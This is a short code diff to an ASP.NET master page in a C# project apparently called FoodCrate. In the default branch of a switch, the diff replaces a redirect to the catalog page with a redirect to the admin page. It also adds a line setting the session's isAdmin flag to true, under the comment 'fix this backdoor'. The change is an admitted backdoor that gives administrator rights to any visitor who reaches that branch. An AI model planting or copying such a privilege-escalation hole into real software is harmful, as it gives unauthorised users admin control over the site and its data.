@@ -86,7 +86,8 @@ namespace FoodCrate_V1._01.MasterPage
                         break;
 
                     default:
-                        Page.Response.Redirect("../Pages/Catalog.aspx");
+                        Page.Response.Redirect("../Pages/AdminPage.aspx"); // fix this backdoor
+                        Session["isAdmin"] = true;
                         break;
                 }
                 
